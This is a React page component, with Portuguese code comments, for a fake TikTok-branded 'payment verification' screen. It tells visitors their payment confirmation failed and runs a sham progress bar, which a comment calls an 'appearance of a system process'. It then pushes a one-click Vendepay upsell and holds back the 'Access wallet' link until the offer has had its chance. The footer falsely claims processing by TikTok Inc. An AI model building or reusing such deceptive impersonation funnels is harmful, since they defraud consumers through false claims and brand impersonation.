import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { track } from "@/lib/track";
import tiktokLogo from "@/assets/tiktok-logo.png";



export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Payment Verification" },
      { name: "description", content: "Payment received. Automatic confirmation failed. Complete the reverification." },
      { property: "og:title", content: "Payment Verification" },
      { property: "og:description", content: "Payment received. Automatic confirmation failed. Complete the reverification." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Index,
});

const CIRCUMFERENCE = 2 * Math.PI * 45;
const WALLET_URL = "https://walletsecurity.bolt.host/";
// Popup SÓ existe como rede de segurança: quando a oferta não carregou.
const POPUP_NO_UPSELL_MS = 20000;
// Oferta na tela: só depois de muito tempo parado (o lead já decidiu).
const POPUP_UPSELL_IDLE_MS = 180000;
// Ritmo da barra: igual ao arquivo original (45ms ≈ 4,5s).
const PROGRESS_TICK_MS = 45;


declare global {
  interface Window {
    VendepayUpsellWidget?: { showIframe: (containerId: string) => void };
  }
}

function Index() {
  const [progress, setProgress] = useState(0);
  const [started, setStarted] = useState(false);
  const [completed, setCompleted] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [upsellVisible, setUpsellVisible] = useState(false);
  const [upsellDone, setUpsellDone] = useState(false);
  const upsellContainerRef = useRef<HTMLDivElement>(null);
  const upsellLoadedRef = useRef(false);



  // Barra de progresso (idêntico ao original)
  useEffect(() => {
    if (!started) return;
    const interval = setInterval(() => {
      setProgress((p) => {
        if (p >= 100) {
          clearInterval(interval);
          return 100;
        }
        return Math.min(100, p + 1);
      });
    }, PROGRESS_TICK_MS);
    return () => clearInterval(interval);
  }, [started]);

  // Conclusão (idêntico ao original: 500ms após 100%)
  useEffect(() => {
    if (progress < 100) return;
    track("progress_complete");
    const timeout = setTimeout(() => setCompleted(true), 500);
    return () => clearTimeout(timeout);
  }, [progress]);

  // Popup de validação concluída — NUNCA compete com o upsell one-click.
  // A interação com a oferta não libera mais o popup (isso tirava o lead da compra).
  useEffect(() => {
    if (!completed || showPopup) return;
    const delay = upsellVisible ? POPUP_UPSELL_IDLE_MS : POPUP_NO_UPSELL_MS;
    const t = setTimeout(() => {
      setShowPopup(true);
      track("popup_shown", { upsell_visible: upsellVisible, upsell_interacted: upsellDone });
    }, delay);
    return () => clearTimeout(t);
  }, [completed, upsellVisible, upsellDone, showPopup]);






  // Registro da visita — inclui se a URL trouxe o identificador da venda
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    track("page_view", {
      referrer: document.referrer || null,
      has_venda_id: Boolean(params.get("vendaId")),
      query_keys: Array.from(params.keys()).join(","),
    });
  }, []);


  // Recupera o toque feito antes da hidratação (3G / celular lento)
  useEffect(() => {
    if ((window as unknown as { __earlyVerifyTap?: boolean }).__earlyVerifyTap) {
      setStarted(true);
      track("verify_click", { via: "early_tap" });
    }
  }, []);


  // Salva os parâmetros da URL para o upsell
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (Array.from(params.keys()).length > 0) {
      sessionStorage.setItem("vendepay_checkout_params", params.toString());
    }
  }, []);

  // Carrega o widget de upsell (código original — não alterado)
  useEffect(() => {
    if (!completed || upsellLoadedRef.current || !upsellContainerRef.current) return;
    upsellLoadedRef.current = true;
    const params = new URLSearchParams(
      window.location.search || sessionStorage.getItem("vendepay_checkout_params") || "",
    );
    params.set("upsellId", "d008b783-7445-4ec4-956c-865ae6c660ef");
    const script = document.createElement("script");
    script.src = `https://widget.vendepay.com/upsell-widget/v1/vendepay-upsell-widget-1.0.16.js?${params.toString()}`;
    script.async = true;
    script.onload = () => {
      window.VendepayUpsellWidget?.showIframe("vendepay-upsell-container");
      track("widget_script_loaded");
    };
    script.onerror = () => track("widget_script_error");
    document.body.appendChild(script);
  }, [completed]);

  // Observadores passivos: iframe do upsell visível e interação do lead
  useEffect(() => {
    const container = upsellContainerRef.current;
    if (!completed || !container) return;
    let iframeSeen = false;
    // Momento em que a oferta apareceu — usado para separar auto-foco de toque real
    let offerAt: number | null = null;
    const enablePayment = (frame: HTMLIFrameElement) => {
      // Libera Payment Request / carteiras dentro do iframe da oferta
      const allow = "payment *; clipboard-write *";
      if (frame.getAttribute("allow") !== allow) frame.setAttribute("allow", allow);
      // Rede de segurança: iframe colapsado esconde o botão de compra do lead
      if (frame.style.minHeight !== "149px") frame.style.minHeight = "149px";
      if (frame.style.width !== "100%") frame.style.width = "100%";
    };
    // A oferta nasce abaixo da dobra no mobile: traz ela pra tela.
    const revealOffer = () => {
      try {
        container.scrollIntoView({ behavior: "smooth", block: "center" });
      } catch {
        /* ignora */
      }
    };
    const observer = new MutationObserver(() => {
      const frame = container.querySelector("iframe");
      if (frame) enablePayment(frame as HTMLIFrameElement);
      if (!iframeSeen && frame) {
        iframeSeen = true;
        offerAt = Date.now();
        setUpsellVisible(true);
        track("upsell_iframe_visible");
        setTimeout(revealOffer, 400);
      }
    });
    observer.observe(container, { childList: true, subtree: true });
    const existing = container.querySelector("iframe");
    if (existing) {
      enablePayment(existing as HTMLIFrameElement);
      iframeSeen = true;
      offerAt = Date.now();
      setUpsellVisible(true);
      setTimeout(revealOffer, 400);
    }


    let interacted = false;
    // Gesto real do usuário na página (evita contar foco automático do iframe)
    let userGestured = false;
    const markGesture = () => {
      userGestured = true;
    };
    document.addEventListener("pointerdown", markGesture, { passive: true, capture: true });
    document.addEventListener("touchstart", markGesture, { passive: true, capture: true });

    const onInteract = (via: string) => {
      if (interacted) return;
      interacted = true;
      setUpsellDone(true);
      track("upsell_interaction", { via, gestured: userGestured });
    };
    // Só conta como interação se o toque foi sobre o próprio iframe da oferta
    const onPointer = (ev: Event) => {
      const target = ev.target as HTMLElement | null;
      if (target && target.tagName === "IFRAME") onInteract("iframe_pointer");
    };
    /** Toque DENTRO de um iframe cross-origin não chega à página: nesses casos
     * `userGestured` nunca vira true e a interação era perdida. Por isso, além
     * do gesto na página, aceitamos o foco no iframe quando ele acontece bem
     * depois da injeção (auto-foco ocorre nos primeiros instantes). */
    const focusCounts = () => {
      if (userGestured) return true;
      return offerAt !== null && Date.now() - offerAt > 1500;
    };
    // Só conta blur como interação se o foco estiver dentro do iframe da oferta
    const onBlur = () => {
      const active = document.activeElement;
      if (!focusCounts()) return;
      if (active && active.tagName === "IFRAME" && container.contains(active)) {
        onInteract("iframe_focus");
      }
    };


    // Contexto do ambiente: ajuda a cruzar colapso de altura com device/rede
    const startedAt = Date.now();
    const ua = navigator.userAgent;
    const env = () => {
      const conn = (navigator as unknown as { connection?: { effectiveType?: string; downlink?: number } }).connection;
      return {
        dt_ms: Date.now() - startedAt,
        ua: ua.slice(0, 180),
        inapp: /TikTok|musical_ly|Bytedance|FBAN|FBAV|Instagram/i.test(ua),
        ios: /iPhone|iPad|iPod/i.test(ua),
        net: conn?.effectiveType ?? null,
        downlink: conn?.downlink ?? null,
        vw: window.innerWidth,
      };
    };

    // Sinal real do checkout: mensagens que o iframe da oferta envia pra página
    let msgCount = 0;
    // Altura REAL informada pelo checkout (antes do mínimo visual de 149px)
    let resizeLogs = 0;
    let lastReported = -1;
    let sameCount = 0;
    const readHeight = (d: unknown): number | null => {
      if (typeof d === "number") return d;
      if (typeof d === "string") {
        const m = /(\d{2,5})(?:px)?/.exec(d);
        return m ? Number(m[1]) : null;
      }
      if (d && typeof d === "object") {
        const o = d as Record<string, unknown>;
        for (const k of ["height", "scrollHeight", "value", "payload", "data"]) {
          const v = o[k];
          if (typeof v === "number") return v;
          if (typeof v === "string" && /^\d{2,5}(px)?$/.test(v)) return parseInt(v, 10);
          if (v && typeof v === "object") {
            const inner = readHeight(v);
            if (inner != null) return inner;
          }
        }
      }
      return null;
    };
    const onMessage = (e: MessageEvent) => {
      if (!e.origin.includes("vendepay.com")) return;
      const d = e.data as unknown;
      const type =
        typeof d === "string"
          ? d.slice(0, 60)
          : d && typeof d === "object"
            ? String((d as Record<string, unknown>)["type"] ?? (d as Record<string, unknown>)["event"] ?? "object")
            : typeof d;
      let payload: string | null = null;
      try {
        payload = JSON.stringify(d).slice(0, 300);
      } catch {
        payload = null;
      }

      // Toda mensagem de altura é logada com contexto (não só as pequenas)
      const isHeightMsg = /height|resize/i.test(`${type} ${payload ?? ""}`);
      if (isHeightMsg) {
        const h = readHeight(d);
        if (h != null) {
          if (h === lastReported) sameCount += 1;
          else sameCount = 0;
          const changed = h !== lastReported;
          lastReported = h;
          if (resizeLogs < 3 && changed) {
            resizeLogs += 1;
            track("upsell_resize", {
              reported_height: h,
              repeats: sameCount,
              seq: resizeLogs,
              collapsed: h < 150,
              ...env(),
            });
          }
        }
      }

      // Diagnóstico de mensagens desativado: gerava ~12 requisições por sessão
      // e deixava a página lenta em 3G/WebView. `msgCount` fica só como contador.
      msgCount += 1;

      if (/accept|approv|success|paid|purchase|confirm/i.test(payload ?? "")) {
        accepted = true;
        onInteract("message");
        track("upsell_accepted", { type });
      }
    };


    // Altura da oferta: se ficar minúscula, o lead não vê o botão de compra
    let maxH = 0;
    let heightLogs = 0;
    let accepted = false;
    let lastStyleH = 0;
    let firstOkAt: number | null = null; // quando a oferta finalmente passou de 150px
    const heightTimer = setInterval(() => {
      const frame = container.querySelector("iframe") as HTMLIFrameElement | null;
      if (!frame) return;
      // style.height = valor aplicado pelo widget; rect = já com o mínimo de 149px
      const styleH = parseInt(frame.style.height || "0", 10) || 0;
      const h = Math.round(frame.getBoundingClientRect().height);
      if (styleH) lastStyleH = styleH;
      if (styleH >= 150 && firstOkAt === null) firstOkAt = Date.now() - startedAt;
      if (h > maxH || (styleH && styleH !== maxH)) {
        maxH = Math.max(maxH, h);
        // Registra também alturas pequenas — é o sinal de oferta colapsada
        if (heightLogs < 2) {
          heightLogs += 1;
          track("upsell_height", {
            height: h,
            style_height: styleH || null,
            collapsed: styleH ? styleH < 150 : h < 120,
            ...env(),
          });
        }
      }
    }, 3000);

    // Resumo da sessão: desfecho + altura final (settled), sem precisar
    // reprocessar toda a série de eventos de altura.
    let summarySent = false;
    const sendSummary = (reason: string) => {
      if (summarySent) return;
      summarySent = true;
      const frame = container.querySelector("iframe") as HTMLIFrameElement | null;
      const settled = frame ? parseInt(frame.style.height || "0", 10) || lastStyleH : lastStyleH;
      track("session_summary", {
        reason,
        converted: accepted,
        interacted,
        offer_shown: iframeSeen,
        settled_height: settled || null,
        reported_height: lastReported >= 0 ? lastReported : null,
        stuck_compact: settled ? settled < 120 : true,
        resolved_by_itself: firstOkAt !== null,
        time_to_ok_ms: firstOkAt,
        ...env(),
      });
    };
    const heightStop = setTimeout(() => {
      clearInterval(heightTimer);
      sendSummary("timeout_120s");
    }, 120000);
    const onLeave = () => {
      if (document.visibilityState === "hidden") sendSummary("page_hidden");
    };
    document.addEventListener("visibilitychange", onLeave);
    window.addEventListener("pagehide", () => sendSummary("pagehide"));



    container.addEventListener("pointerdown", onPointer, { passive: true });
    window.addEventListener("blur", onBlur, { passive: true });
    window.addEventListener("message", onMessage);

    // Fallback: em mobile/WebView o evento blur nem sempre dispara.
    // Verifica periodicamente se o foco caiu dentro do iframe da oferta.
    const focusPoll = setInterval(() => {
      if (interacted) {
        clearInterval(focusPoll);
        return;
      }
      if (!focusCounts()) return;
      const active = document.activeElement;
      if (active && active.tagName === "IFRAME" && container.contains(active)) {
        onInteract("focus_poll");
      }
    }, 700);
    const focusPollStop = setTimeout(() => clearInterval(focusPoll), 180000);

    return () => {
      observer.disconnect();
      clearInterval(heightTimer);
      clearTimeout(heightStop);
      clearInterval(focusPoll);
      clearTimeout(focusPollStop);
      document.removeEventListener("visibilitychange", onLeave);
      document.removeEventListener("pointerdown", markGesture, true);
      document.removeEventListener("touchstart", markGesture, true);
      container.removeEventListener("pointerdown", onPointer);
      window.removeEventListener("blur", onBlur);
      window.removeEventListener("message", onMessage);
    };



  }, [completed]);



  const statusLabel = started
    ? progress < 100
      ? "Reverifying..."
      : "Verification complete!"
    : "Click to re-verify";

  const steps = [
    { label: "Payment received", done: true },
    { label: "Checking payment", done: started },
    { label: "Reverification", done: progress >= 100 },
  ];

  return (
    <main className="min-h-screen bg-app-bg font-app text-app-ink antialiased">
      {/* Barra superior com a logo */}
      <header className="flex items-center justify-center border-b border-app-line bg-app-surface py-4">
        <img src={tiktokLogo} alt="TikTok" className="h-7 w-auto" />

      </header>

      <div className="mx-auto w-full max-w-[440px] px-4 pb-16 pt-4">
        {/* Título + explicação curta — primeira dobra */}
        <section className="mt-4 rounded-[20px] bg-app-surface p-4">

          <h1 className="text-[17px] font-bold leading-snug tracking-tight">
            Payment verification required
          </h1>
          <p className="mt-2 text-[14px] leading-relaxed text-app-ink-soft">
            Your payment requires one final verification before your access can be completed.
          </p>
        </section>

        {/* Ação principal — CTA acima da dobra */}
        <section className="mt-4">
          <button
            data-verify-btn
            onPointerDown={() => {
              if (started) return;
              setStarted(true);
              track("verify_click", { via: "pointerdown" });
            }}
            onClick={() => setStarted(true)}
            disabled={started}
            className={`h-[60px] w-full cursor-pointer rounded-[14px] bg-app-success text-[17px] font-extrabold tracking-tight text-white shadow-[0_4px_14px_rgba(0,0,0,0.12)] transition-all duration-150 hover:-translate-y-0.5 hover:shadow-[0_6px_20px_rgba(0,0,0,0.16)] active:scale-[0.98] disabled:translate-y-0 disabled:cursor-not-allowed disabled:opacity-95 ${!started ? "app-btn-glow" : ""}`}
          >
            {completed ? "Payment confirmed" : "REVERIFY PAYMENT →"}
          </button>
          {!started && (
            <p className="mt-2 text-center text-[13px] font-medium text-app-ink-soft">
              Tap here to verify your payment
            </p>
          )}
        </section>

        {/* Componente de progresso — aparência de processo do sistema */}
        <section className="mt-4 rounded-[20px] bg-app-surface p-6">
          <div className="flex justify-center">
            <div className="relative h-[168px] w-[168px]">
              <svg viewBox="0 0 100 100" className="h-full w-full -rotate-90">
                <circle cx="50" cy="50" r="45" fill="none" stroke="var(--app-line)" strokeWidth="5" />
                <circle
                  cx="50"
                  cy="50"
                  r="45"
                  fill="none"
                  stroke={completed ? "var(--app-ink)" : "var(--app-success)"}
                  strokeWidth="5"
                  strokeLinecap="round"
                  strokeDasharray={CIRCUMFERENCE}
                  strokeDashoffset={CIRCUMFERENCE - (CIRCUMFERENCE * progress) / 100}
                  style={{ transition: "stroke-dashoffset 0.2s linear" }}
                />
              </svg>
              <div className="absolute inset-0 flex flex-col items-center justify-center">
                <span className="text-[34px] font-extrabold leading-none tracking-tight">
                  {progress}
                  <span className="text-[16px] font-bold text-app-ink-soft">%</span>
                </span>
                <span
                  className={`mt-2 text-[12px] font-semibold tracking-tight ${
                    completed ? "text-app-ink" : "text-app-ink-soft"
                  }`}
                >
                  {statusLabel}
                </span>
                {started && !completed && (
                  <span className="mt-2 flex gap-1">
                    {[0, 1, 2].map((i) => (
                      <span
                        key={i}
                        className="app-dot h-1 w-1 rounded-full bg-app-success"
                        style={{ animationDelay: `${i * 0.15}s` }}
                      />
                    ))}
                  </span>
                )}
              </div>
            </div>
          </div>

          {/* Estados do processo */}
          <ul className="mt-5 divide-y divide-app-line border-t border-app-line">
            {steps.map((step) => (
              <li key={step.label} className="flex items-center gap-3 py-3">
                <span
                  className={`flex h-5 w-5 shrink-0 items-center justify-center rounded-full text-[11px] font-bold ${
                    step.done
                      ? "bg-app-success/15 text-app-success"
                      : "bg-app-ink/5 text-app-ink-soft"
                  }`}
                >
                  {step.done ? "✓" : "•"}
                </span>
                <span
                  className={`text-[13px] tracking-tight ${
                    step.done ? "font-semibold text-app-ink" : "text-app-ink-soft"
                  }`}
                >
                  {step.label}
                </span>
                <span className="ml-auto text-[11px] font-semibold uppercase tracking-wide text-app-ink-soft">
                  {step.done ? "Done" : started ? "Running" : "Pending"}
                </span>
              </li>
            ))}
          </ul>
        </section>

        {completed && (
          <>
            <section className="mt-4 flex items-start gap-3 rounded-[20px] bg-app-surface p-5">
              <span className="mt-0.5 flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-app-cyan text-[12px] font-bold text-white">
                ✓
              </span>
              <div>
                <h3 className="text-[15px] font-bold tracking-tight">Verification complete!</h3>
                <p className="mt-1 text-[13px] leading-relaxed text-app-ink-soft">
                  Your payment is confirmed. Access release is pending.
                </p>
              </div>
            </section>
            <section className="mt-5">
              <div id="vendepay-upsell-container" ref={upsellContainerRef} />
            </section>
            <section className={`mt-5 pb-24 ${upsellVisible ? "hidden" : ""}`}>

              <a
                href={WALLET_URL}
                onClick={() => track("wallet_click", { from: "inline" })}
                className="flex h-[52px] w-full items-center justify-center rounded-[14px] bg-app-ink text-[16px] font-bold tracking-tight text-white"
              >

                Access wallet
              </a>
            </section>
          </>
        )}

        {/* Informações secundárias — mantidas abaixo do CTA */}
        <section className="mt-4 rounded-[20px] bg-app-surface px-5 py-5 text-center">
          <span className="mx-auto flex h-8 w-8 items-center justify-center rounded-full bg-app-pink/10 text-[14px] font-bold text-app-pink">
            !
          </span>
          <h2 className="mt-3 text-[15px] font-bold leading-snug tracking-tight">
            Payment confirmation incomplete
          </h2>
          <p className="mx-auto mt-2 max-w-[300px] text-[13.5px] leading-[1.55] text-app-ink-soft">
            We received your payment, but the{" "}
            <span className="font-semibold text-app-ink">automatic confirmation</span> could not be completed. A quick{" "}
            <span className="font-semibold text-app-ink">re-verification</span> is required to continue.
          </p>
          <p className="mt-3 text-[13px] font-medium text-app-ink-soft/80">
            Tap the button above to re-verify your payment.
          </p>
        </section>


        {/* Rodapé */}
        <footer className="mt-6 text-center">
          <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-2 text-[12.5px] font-medium text-app-ink-soft">
            <span className="flex items-center gap-1.5">
              <svg viewBox="0 0 24 24" className="h-4 w-4 text-app-success" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10Z" />
                <path d="m9 12 2 2 4-4" />
              </svg>
              Secure payment
            </span>
            <span className="flex items-center gap-1.5">
              <svg viewBox="0 0 24 24" className="h-4 w-4 text-app-success" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
                <rect x="3" y="11" width="18" height="10" rx="2" />
                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
              </svg>
              Protected instant transfer
            </span>
          </div>

          <p className="mt-4 text-[11px] leading-relaxed text-app-ink-soft/80">
            Processed by TikTok Inc. — a ByteDance company (EIN 46-4728543)
          </p>
        </footer>
      </div>


      {/* Popup de validação concluída — modal centralizado padrão */}
      {showPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 px-4">
          <div className="w-full max-w-[340px] rounded-[20px] bg-app-surface p-6 shadow-[0_8px_40px_rgba(0,0,0,0.18)]">
            <div className="flex flex-col items-center text-center">
              <span className="flex h-12 w-12 items-center justify-center rounded-full bg-app-success text-[20px] font-bold text-white">
                ✓
              </span>
              <h3 className="mt-4 text-[18px] font-bold tracking-tight">Validation complete</h3>
              <p className="mt-2 text-[14px] leading-relaxed text-app-ink-soft">
                Your payment has been validated. Your wallet access is ready.
              </p>
            </div>
            <a
              href={WALLET_URL}
              onClick={() => track("wallet_click", { from: "popup" })}
              className="mt-6 flex h-[52px] w-full items-center justify-center rounded-[14px] bg-app-ink text-[16px] font-bold tracking-tight text-white"
            >

              Access wallet
            </a>
          </div>
        </div>
      )}
    </main>
  );
}
